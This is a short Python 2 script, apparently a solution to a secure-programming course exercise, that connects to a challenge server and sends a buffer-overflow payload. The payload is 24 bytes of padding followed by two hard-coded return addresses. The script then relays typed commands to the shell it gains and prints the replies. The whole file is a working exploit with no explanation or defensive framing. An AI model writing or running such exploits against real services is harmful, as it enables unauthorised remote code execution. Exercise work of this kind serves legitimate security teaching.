#!/usr/bin/python
import socket

SIZE = 1024

# connect
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('secprog.cs.nctu.edu.tw', 10106))
init_msg = c.recv(SIZE)
print 'init: ' + init_msg

# send/recv
message = 'a' * 24 + '\xe0\x83\x04\x08' + 'a' * 4 + '\x40\x86\x04\x08\n'
c.send(message)

while 1:
    com = raw_input()
    c.send(com+'\n');
    print 's >> ' + com

    r = c.recv(SIZE)
    if not r:
        break
    print 'r >> ' + r

# close
c.close()
